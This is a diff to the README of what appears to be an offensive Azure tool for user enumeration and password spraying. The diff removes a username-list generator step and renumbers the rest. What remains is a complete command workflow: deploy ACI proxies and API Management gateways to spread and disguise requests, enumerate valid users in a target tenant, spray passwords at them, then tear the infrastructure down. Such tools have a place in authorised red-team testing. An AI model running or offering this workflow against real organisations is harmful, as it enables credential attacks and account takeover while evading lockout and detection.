@@ -52,7 +52,6 @@ az login
 | `apimspray.py` | Main tool — spray, validate, enumerate |
 | `apimcreate.py` | Deploy APIM gateways for spray/validate |
 | `onedrive_proxy.py` | Deploy ACI proxies for user enumeration |
-| `generate_upns.py` | Generate UPN wordlists from tenant domains |
 
 ---
 
@@ -102,17 +101,7 @@ Default regions (when `--regions` is not set): `eastus`, `eastus2`, `westus`, `w
 
 > **Quota note:** Azure limits ACI to 10 CPU cores per region (~20 containers at 0.5 CPU each). Spreading across regions avoids hitting this limit.
 
-### Step 2: Build a Username List (Optional)
-
-If you don't have a user list, generate one from the target tenant's domains:
-
-```bash
-python3 generate_upns.py --target contoso.com
-# OR
-python3 generate_upns.py --target 00000000-0000-0000-0000-000000000000
-```
-
-### Step 3: Run Enumeration
+### Step 2: Run Enumeration
 
 ```bash
 # With proxies (recommended) — no --tenant needed, proxies are already configured
@@ -269,19 +258,16 @@ Results are stored in `results/<timestamp>/`:
 ## Typical Workflow
 
 ```bash
-# 1. Generate username list
-python3 generate_upns.py --target contoso.com
-
-# 2. Deploy ACI proxies for enumeration
+# 1. Deploy ACI proxies for enumeration
 python3 onedrive_proxy.py --deploy --tenant contoso.com --count 50 --outfile enum_urls.txt
 
-# 3. Enumerate valid users
+# 2. Enumerate valid users
 python3 apimspray.py --mode enumerate --users users.txt --aci-urls enum_urls.txt --enum-pace turbo
 
-# 4. Deploy APIM gateways for spraying
+# 3. Deploy APIM gateways for spraying
 python3 apimcreate.py --type login --count 33 --outfile spray_urls.txt
 
-# 5. Spray enumerated users
+# 4. Spray enumerated users
 python3 apimspray.py --mode spray \
     --urls spray_urls.txt \
     --users results/<timestamp>/enumerated_<timestamp>.txt \
@@ -289,7 +275,7 @@ python3 apimspray.py --mode spray \
     --tenant contoso.com \
     --pace medium
 
-# 6. Clean up
+# 5. Clean up
 python3 onedrive_proxy.py --destroy
 python3 apimcreate.py --type login --delete-only
 ```
